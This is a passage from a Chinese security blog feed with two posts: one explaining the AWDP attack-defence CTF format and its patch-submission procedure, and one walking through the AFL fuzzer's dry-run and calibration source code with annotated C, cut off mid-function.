    <content type="html"><![CDATA[<h2 id="赛制介绍"><a href="#赛制介绍" class="headerlink" title="赛制介绍"></a>赛制介绍</h2><p>AWDP（AWD Plus）是<strong>一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式</strong>。 每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。 AWDP一般分为两个板块，Break（自己的payload打通）和Fix（让主办方的payload打不通）。–来自csdn</p><h2 id="赛制流程"><a href="#赛制流程" class="headerlink" title="赛制流程"></a>赛制流程</h2><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>和正常 CTF 赛制一样，开启靶机打远程，提交 flag</p><img src="/2025/04/06/awdp-sai-zhi-liu-cheng-yu-ji-qiao/image-20250406162318841.png" alt="image-20250406162318841" style="zoom: 67%;" align="left"><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>需要上传一个 tar.gz 压缩包，包含 </p><ul><li>patch 后的可执行文件 &#x2F; 网页</li><li>一个用于将 patch 后文件替换进服务器的 shell 脚本</li></ul><p>ps：web patch 可能要求仅使用 sed 指令去 patch</p><p>shell 脚本示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#！/bin/sh</span><span class="token function">mv</span> xxx /home/ctf/pwn<span class="token function">chmod</span> <span class="token number">777</span> /home/ctf/pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>打包指令：将 patch 后的文件和用于替换的 shell 脚本放在同一个目录中，在该目录中执行以下指令将所在目录下所有文件打包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zcvf</span> fix.tar.gz *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pwn patch 可以参考我的另一篇文章：<a href="https://starrysky1004.github.io/2024/04/26/awd-pwn/awd-pwn/">https://starrysky1004.github.io/2024/04/26/awd-pwn/awd-pwn/</a></p><img src="/2025/04/06/awdp-sai-zhi-liu-cheng-yu-ji-qiao/image-20250406162110152.png" alt="image-20250406162110152" style="zoom:67%;" align="left"><h3 id="提交记录"><a href="#提交记录" class="headerlink" title="提交记录"></a>提交记录</h3><p>这里会显示 check 结果，包括</p><ul><li>服务异常：干扰了程序正常运行，也就是过度 patch</li><li>exp利用成功：patch 后的程序仍然存在漏洞能够被主办方的 payload 打通</li><li>操作失败：用于替换文件的脚本执行失败，这种情况下在下一次的脚本里还需要还原上一次脚本的错误操作，否则可能一直操作失败</li><li>防御成功</li></ul><img src="/2025/04/06/awdp-sai-zhi-liu-cheng-yu-ji-qiao/image-20250406162149329.png" alt="image-20250406162149329" style="zoom: 67%;"><h2 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h2><p>实在没有思路的时候可以试试，大部分应该用不了的，不过也不要因为其中一题某种方式过不了 check 就认为其他都过不了，毕竟每题 check 可能不是一个人写的</p><ul><li>shell 脚本里写一些阻止获取 flag 的指令</li><li>上通防，pwn 上沙箱，web 上 watchbird</li><li>堆题将 free 直接 nop</li><li>…</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;赛制介绍&quot;&gt;&lt;a href=&quot;#赛制介绍&quot; class=&quot;headerlink&quot; title=&quot;赛制介绍&quot;&gt;&lt;/a&gt;赛制介绍&lt;/h2&gt;&lt;p&gt;AWDP（AWD Plus）是&lt;strong&gt;一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式&lt;/stro</summary>
      
    
    
    
    <category term="AWDP" scheme="https://starrysky1004.github.io/categories/AWDP/"/>
    
    
    <category term="AWDP" scheme="https://starrysky1004.github.io/tags/AWDP/"/>
    
  </entry>
  
  <entry>
    <title>AFL源码分析（二）</title>
    <link href="https://starrysky1004.github.io/2025/03/10/afl-yuan-ma-fen-xi-er/afl-yuan-ma-fen-xi-er/"/>
    <id>https://starrysky1004.github.io/2025/03/10/afl-yuan-ma-fen-xi-er/afl-yuan-ma-fen-xi-er/</id>
    <published>2025-03-10T07:42:37.000Z</published>
    <updated>2025-03-10T07:43:47.252Z</updated>
    
    <content type="html"><![CDATA[<h3 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h3><p>执行所有的测试用例，以检查是否按预期工作(dry run：试运行）</p><ul><li>从环境变量获取是否跳过崩溃测试用例的设置</li><li>循环遍历队列<ul><li>获取文件名，不包含路径</li><li>打开遍历到的测试用例，打开失败则报错</li><li>为测试用例数据创建空间，读取测试用例内容，失败则报错退出，成功则关闭文件</li><li>调用 <a href="##calibrate_case">calibrate_case</a> 校准该测试用例，评估 input 文件夹下的 case，之后释放测试用例内容空间</li><li>如果 stop_soon 为真，即用户退出测试，则返回</li><li>如果 res 的结果为 crash_mode 或者为 FAULT_NOBITS，打印相关的信息</li><li>根据返回结果对应不同选项<ul><li>FAULT_NONE：如果是第一个测试用例则调用 check_map_coverage 函数，评估覆盖率；如果设置了 crash mode 则报错退出，因为该例不产生 crash</li><li>FAULT_TMOUT：超时，如果设置了超时时间并且大于 1，则标记为校准失败并增加失败计数，否则报错退出</li><li>FAULT_CRASH：崩溃，设置了 crash mode 就跳过，设置了 skip_crashes 则标记为校准失败并增加失败计数，否则报错退出</li><li>FAULT_ERROR：程序执行错误，报错退出</li><li>FAULT_NOINST：未检测到插桩，没有出现任何路径信息，报错退出</li><li>FAULT_NOBITS：有路径信息但没新路径，认为这是无用路径，useless_at_start计数器加一</li></ul></li><li>var_behavior 为真说明多次运行同一个测试用例有不同的表现，抛出警告</li><li>指向下一个测试用例继续循环</li></ul></li><li>失败次数不为 0 时<ul><li>所有测试用例均失败则报错退出</li><li>测试用例数量大于失败样例五倍的时候抛出警告</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">perform_dry_run</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> q <span class="token operator">=</span> queue<span class="token punctuation">;</span>  u32 cal_failures <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 用于记录校准失败的次数</span>  u8<span class="token operator">*</span> skip_crashes <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_SKIP_CRASHES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 从环境变量获取是否跳过崩溃测试用例的设置</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//循环遍历队列</span>    u8<span class="token operator">*</span> use_mem<span class="token punctuation">;</span>    u8  res<span class="token punctuation">;</span>    s32 fd<span class="token punctuation">;</span>    u8<span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>q<span class="token operator">-></span>fname<span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//获取文件名，不包含路径</span>    <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Attempting dry run with '%s'..."</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>q<span class="token operator">-></span>fname<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开测试用例文件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to open '%s'"</span><span class="token punctuation">,</span> q<span class="token operator">-></span>fname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开失败则报错</span>    use_mem <span class="token operator">=</span> <span class="token function">ck_alloc_nozero</span><span class="token punctuation">(</span>q<span class="token operator">-></span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为测试用例创建空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> use_mem<span class="token punctuation">,</span> q<span class="token operator">-></span>len<span class="token punctuation">)</span> <span class="token operator">!=</span> q<span class="token operator">-></span>len<span class="token punctuation">)</span><span class="token comment">//读取测试用例的值，失败则报错退出</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Short read from '%s'"</span><span class="token punctuation">,</span> q<span class="token operator">-></span>fname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件</span>    res <span class="token operator">=</span> <span class="token function">calibrate_case</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> q<span class="token punctuation">,</span> use_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//校准该测试用例，评估 input 文件夹下的 case</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>use_mem<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放测试用例空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//如果用户中断就返回</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> crash_mode <span class="token operator">||</span> res <span class="token operator">==</span> FAULT_NOBITS<span class="token punctuation">)</span><span class="token comment">//如果 res 的结果为 crash_mode 或者为 FAULT_NOBITS，打印相关的信息</span>      <span class="token function">SAYF</span><span class="token punctuation">(</span>cGRA <span class="token string">"    len = %u, map size = %u, exec speed = %llu us\n"</span> cRST<span class="token punctuation">,</span>            q<span class="token operator">-></span>len<span class="token punctuation">,</span> q<span class="token operator">-></span>bitmap_size<span class="token punctuation">,</span> q<span class="token operator">-></span>exec_us<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出  len = 4, map size = 2, exec speed = 379251877 us</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> FAULT_NONE<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>q <span class="token operator">==</span> queue<span class="token punctuation">)</span> <span class="token function">check_map_coverage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果是第一个测试用例，调用 check_map_coverage 评估覆盖率</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>crash_mode<span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Test case '%s' does *NOT* crash"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置了 crash mode 则报错退出</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> FAULT_TMOUT<span class="token operator">:</span><span class="token comment">//超时</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>timeout_given<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//设置了超时时间</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>timeout_given <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//超时时间大于 1</span>            <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"Test case results in a timeout (skipping)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 超时但设置为跳过</span>            q<span class="token operator">-></span>cal_failed <span class="token operator">=</span> CAL_CHANCES<span class="token punctuation">;</span><span class="token comment">// 标记为校准失败</span>            cal_failures<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">// 增加失败计数</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST               <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>               exec_tmout<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Test case '%s' results in a timeout"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 超时且未设置跳过，报错</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST              <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>               <span class="token string">"    altogether, and find one that is less of a CPU hog.\n"</span><span class="token punctuation">,</span> exec_tmout<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Test case '%s' results in a timeout"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token keyword">case</span> FAULT_CRASH<span class="token operator">:</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>crash_mode<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//设置了 crash mode 则跳过</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>skip_crashes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//设置了跳过 crash，提示 crash 但是跳过，标记为校准失败并增加失败计数</span>          <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"Test case results in a crash (skipping)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          q<span class="token operator">-></span>cal_failed <span class="token operator">=</span> CAL_CHANCES<span class="token punctuation">;</span>          cal_failures<span class="token operator">++</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_limit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//设置了 mem_limit 则程序崩溃了，给出可能的原因包括内存限制问题</span>          <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST               <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>               <span class="token function">DMS</span><span class="token punctuation">(</span>mem_limit <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mem_limit <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> doc_path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST               <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span>        <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Test case '%s' results in a crash"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> FAULT_ERROR<span class="token operator">:</span><span class="token comment">// 执行错误</span>        <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to execute target application ('%s')"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> FAULT_NOINST<span class="token operator">:</span><span class="token comment">// 未检测到插桩，没有出现任何路径信息</span>        <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"No instrumentation detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> FAULT_NOBITS<span class="token operator">:</span> <span class="token comment">// 有路径信息但没新路径</span>        useless_at_start<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//认为这是无用路径，useless_at_start计数器加一</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_bitmap <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>shuffle_queue<span class="token punctuation">)</span>          <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"No new instrumentation output, test case may be useless."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>var_behavior<span class="token punctuation">)</span> <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"Instrumentation output varies across runs."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// var_behavior 为真说明多次运行同一个测试用例有不同的表现，抛出警告</span>    q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment">//遍历下一个</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>cal_failures<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//失败次数不为0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cal_failures <span class="token operator">==</span> queued_paths<span class="token punctuation">)</span><span class="token comment">//所有测试用例均失败则报错退出</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"All test cases time out%s, giving up!"</span><span class="token punctuation">,</span>            skip_crashes <span class="token operator">?</span> <span class="token string">" or crash"</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"Skipped %u test cases (%0.02f%%) due to timeouts%s."</span><span class="token punctuation">,</span> cal_failures<span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>cal_failures<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">/</span> queued_paths<span class="token punctuation">,</span>          skip_crashes <span class="token operator">?</span> <span class="token string">" or crashes"</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cal_failures <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">></span> queued_paths<span class="token punctuation">)</span><span class="token comment">//测试用例数量大于失败样例五倍的时候抛出警告</span>      <span class="token function">WARNF</span><span class="token punctuation">(</span>cLRD <span class="token string">"High percentage of rejected test cases, check settings!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"All test cases processed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h3><p>这里调试的时候需要设置：<code>set follow-fork-mode parent</code> <code>set detach-on-fork on</code> 调试父进程</p><p>进了 queue 的用例，都要被运行一遍 calibrate_case 函数，判断该用例是否异常，发现新路径时评估新发现的 testcase 行为是否可变（即多次执行发现不同的路径）</p><ul><li><p>不来自于 queue 中或者在 resuming sessions 的时候，使用的超时时间设置为更大的数值，避免因间歇性延迟带来的问题</p></li><li><p>增加校准失败次数</p></li><li><p>设置当前阶段名称为校准，设置校准循环次数，如果设置了快速校准则为 3 次，否则 CAL_CYCLES 为 8 次</p></li><li><p>非 dumb 模式、未开启 no_forkserver、forksrv_pid &#x3D; 0，调用 <a href="##init_forkserver">init_forkserver</a> 初始化 forkserver 确保 forkserver 已启动</p></li><li><p>如果已有执行校验和，即当前测试用例不是来自输入文件夹，复制第一次执行的覆盖痕迹</p></li><li><p>获取当前时间作为开始时间</p></li><li><p>循环执行校准</p><ul><li><p>测试用例不是来自输入文件夹，第一轮循环结束后调用 show_stats 显示一次状态，后面不再显示</p></li><li><p><a href="##write_to_testcase">write_to_testcase</a> 将从 q-&gt;fname 中读取的内容写入到 .cur_input 中</p></li><li><p><a href="##run_target">run_target</a> 运行测试用例，结果保存在 fault 中</p></li><li><p>用户手动停止或非崩溃模式的报错跳转到 abort_calibration</p></li><li><p>不是简单模式、是第一轮运行且未检测到插桩输出，标记为无插桩错误，跳转到 abort_calibration</p></li><li><p>计算当前覆盖痕迹的哈希值</p></li><li><p>如果当前覆盖痕迹 cksum 的哈希值与之前 q-&gt;exec_cksum 的哈希值不同，可能是发现新路径或是第一次运行</p><ul><li><p><a href="##has_new_bits">has_new_bits</a> 检测是否有新的覆盖位，返回值给 hnb，hnb 大于 new_bits 时更新 new_bits 为更高优先级的状态</p></li><li><p>q-&gt;exec_cksum 不为 0，说明有新路径</p><p>遍历每一个覆盖字节，检查是否有变化，该边未标记变异且当前边的统计结果发生变化则标记该边变异并设置校准次数为 40、var_detected &#x3D; 1（标记为检测到变异）</p></li><li><p>q-&gt;exec_cksum 为 0，说明是第一次运行，更新覆盖痕迹哈希值和覆盖痕迹</p></li></ul></li></ul></li><li><p>获取当前时间作为结束时间，更新运行时间、执行次数、每次执行时间、覆盖边的数量、记录障碍、总覆盖边的数量、产生的 bitmap 数量，调用 <a href="##update_bitmap_score">update_bitmap_score</a> 计算位图得分，标记此次校准未失败</p></li><li><p>abort_calibration</p><ul><li>如果发现新路径且之前未记录，更新 q-&gt;has_new_cov &#x3D; 1 表示有新路径，增加 queued_with_cov 表示发现新路径的 queue 增加</li><li>如果 queue 是可变路径，调用 <a href="##count_bytes">count_bytes</a> 变异边的数量，代表这些 tuple 具有可变的行为，如果该测试用例变异，标记为变异测试用例并增加变异测试用例数量</li><li>恢复之前的阶段信息</li><li>如果不是第一次运行，显示统计信息</li><li>返回 fault 值</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> u8 <span class="token function">calibrate_case</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> q<span class="token punctuation">,</span> u8<span class="token operator">*</span> use_mem<span class="token punctuation">,</span>                         u32 handicap<span class="token punctuation">,</span> u8 from_queue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">static</span> u8 first_trace<span class="token punctuation">[</span>MAP_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 用于存储第一次执行的覆盖痕迹</span>  u8  fault <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> new_bits <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> var_detected <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>      first_run <span class="token operator">=</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>exec_cksum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//exec_cksum 为 0 代表这个 case 第一次运行，即来自输入文件夹下，设置 first_run 为 1</span>  u64 start_us<span class="token punctuation">,</span> stop_us<span class="token punctuation">;</span>  s32 old_sc <span class="token operator">=</span> stage_cur<span class="token punctuation">,</span> old_sm <span class="token operator">=</span> stage_max<span class="token punctuation">;</span><span class="token comment">// 保存当前阶段信息</span>  u32 use_tmout <span class="token operator">=</span> exec_tmout<span class="token punctuation">;</span><span class="token comment">// 使用的超时时间</span>  u8<span class="token operator">*</span> old_sn <span class="token operator">=</span> stage_name<span class="token punctuation">;</span><span class="token comment">// 保存当前阶段名称</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>from_queue <span class="token operator">||</span> resuming_fuzz<span class="token punctuation">)</span><span class="token comment">//不来自于 queue 中或者在 resuming sessions 的时候</span>    use_tmout <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>exec_tmout <span class="token operator">+</span> CAL_TMOUT_ADD<span class="token punctuation">,</span> exec_tmout <span class="token operator">*</span> CAL_TMOUT_PERC <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//使用的超时时间设置为更大的数值，避免因间歇性延迟带来的问题</span>  q<span class="token operator">-></span>cal_failed<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">// 增加校准失败次数</span>  stage_name <span class="token operator">=</span> <span class="token string">"calibration"</span><span class="token punctuation">;</span><span class="token comment">// 设置当前阶段名称为校准</span>  stage_max  <span class="token operator">=</span> fast_cal <span class="token operator">?</span> <span class="token number">3</span> <span class="token operator">:</span> CAL_CYCLES<span class="token punctuation">;</span><span class="token comment">// 设置校准循环次数，快速校准为 3 次，CAL_CYCLES 为 8 次</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>no_forkserver <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>forksrv_pid<span class="token punctuation">)</span><span class="token comment">//非 dumb 模式、未开启 no_forkserver、forksrv_pid = 0</span>    <span class="token function">init_forkserver</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化 forkserver 确保 forkserver 已启动</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>exec_cksum<span class="token punctuation">)</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>first_trace<span class="token punctuation">,</span> trace_bits<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果已有执行校验和，即当前测试用例不是来自输入文件夹，复制第一次执行的覆盖痕迹</span>  start_us <span class="token operator">=</span> <span class="token function">get_cur_time_us</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前时间作为开始时间</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>stage_cur <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> stage_cur <span class="token operator">&lt;</span> stage_max<span class="token punctuation">;</span> stage_cur<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//循环执行校准</span>    u32 cksum<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>first_run <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>stage_cur <span class="token operator">%</span> stats_update_freq<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">show_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第一轮循环结束后显示一次状态，后面不再显示</span>    <span class="token function">write_to_testcase</span><span class="token punctuation">(</span>use_mem<span class="token punctuation">,</span> q<span class="token operator">-></span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将从 q->fname 中读取的内容写入到 .cur_input 中</span>    fault <span class="token operator">=</span> <span class="token function">run_target</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> use_tmout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//运行测试用例，结果保存在 fault 中</span><span class="token comment">//执行后 trace_bit:</span>    <span class="token comment">//0x7ffff7fb9000：  0x0000000000000000  0x0000000000000000</span>    <span class="token comment">//...</span>    <span class="token comment">//0x7ffff7fba410:0x00010000000000000x0000000000000000</span>    <span class="token comment">//...</span>    <span class="token comment">//0x7ffff7fbac30:0x00000000010000000x0000000000000000</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon <span class="token operator">||</span> fault <span class="token operator">!=</span> crash_mode<span class="token punctuation">)</span> <span class="token keyword">goto</span> abort_calibration<span class="token punctuation">;</span><span class="token comment">//用户手动停止或非崩溃模式的报错跳转到 abort_calibration</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dumb_mode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>stage_cur <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">count_bytes</span><span class="token 